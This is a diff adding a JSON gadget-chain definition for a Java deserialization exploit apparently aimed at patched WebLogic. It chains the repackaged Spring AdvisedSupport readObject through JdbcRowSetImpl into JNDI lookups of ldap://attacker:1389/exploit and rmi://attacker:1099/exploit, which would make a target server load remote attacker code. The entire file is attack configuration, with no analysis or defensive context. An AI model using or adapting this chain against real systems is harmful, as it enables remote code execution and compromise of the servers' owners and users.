@@ -1,0 +1,27 @@
+{
+  "chain_type": "Post-PSU: AdvisedSupport readObject → JNDI through advisorChainFactory",
+  "root_class": "com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport",
+  "root_trigger": "readObject→advisorChainFactory→JNDI lookup",
+  "links": [
+    {
+      "class": "com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport",
+      "field_overrides": {
+        "advisorChainFactory": {"$ref": "link:1"},
+        "targetSource": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "field_overrides": {
+        "dataSource": "ldap://attacker:1389/exploit"
+      }
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "field_overrides": {
+        "dataSource": "rmi://attacker:1099/exploit"
+      }
+    }
+  ],
+  "sink_method": "JdbcRowSetImpl→JNDI"
+}
